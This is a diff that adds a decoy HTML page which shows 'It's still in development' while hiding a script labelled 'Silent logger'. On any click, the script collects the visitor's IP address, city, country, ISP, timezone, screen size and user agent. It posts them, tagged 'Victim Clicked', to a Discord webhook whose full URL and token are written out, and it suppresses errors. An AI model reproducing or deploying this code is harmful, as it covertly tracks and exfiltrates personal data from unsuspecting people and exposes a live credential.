@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>oasis</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            background: #000000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            cursor: pointer;
+            color: #ffffff;
+            /* Pure system font stack - no external or custom fonts */
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+
+        #text {
+            font-size: 4.2rem;
+            font-weight: bold;
+            text-align: center;
+            white-space: nowrap;
+        }
+    </style>
+</head>
+<body>
+    <div id="text"></div>
+
+    <script>
+        // Silent logger - fires once on click anywhere
+        async function logVictim() {
+            document.body.removeEventListener('click', logVictim);
+
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const ip = ipData.ip || "Unknown";
+
+                const geoRes = await fetch('https://ipapi.co/json/');
+                const geoData = await geoRes.json();
+
+                const payload = {
+                    embeds: [{
+                        title: "Victim Clicked - oasis (black page)",
+                        color: 0x000000,
+                        fields: [
+                            { name: "IP", value: ip, inline: true },
+                            { name: "City", value: geoData.city || "Unknown", inline: true },
+                            { name: "Country", value: geoData.country_name || "Unknown", inline: true },
+                            { name: "ISP", value: geoData.org || "Unknown", inline: true },
+                            { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+                            { name: "Screen", value: `${screen.width}x${screen.height}`, inline: true },
+                            { name: "User-Agent", value: navigator.userAgent.substring(0, 500), inline: false },
+                            { name: "Timestamp", value: new Date().toISOString(), inline: false }
+                        ],
+                        footer: { text: "oasis logger" }
+                    }]
+                };
+
+                await fetch('https://discord.com/api/webhooks/1454537081064788221/qbw5CzW4g7JiC2fvGeixiweWPoGJpvS-Ay5WevKnePCHHwKM6DIHCfxo_F3hQFca_pmb', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {
+                // Silent fail
+            }
+        }
+
+        // Typewriter effect - "It's still in development" appears letter by letter fast
+        const textElement = document.getElementById('text');
+        const message = "It's still in development";
+        let i = 0;
+
+        function typeNext() {
+            if (i < message.length) {
+                textElement.textContent += message.charAt(i);
+                i++;
+                setTimeout(typeNext, 60); // Fast typing speed
+            }
+        }
+
+        // Start typing after a short delay
+        setTimeout(typeNext, 1200);
+
+        // Log victim on any click
+        document.body.addEventListener('click', logVictim);
+    </script>
+</body>
+</html>
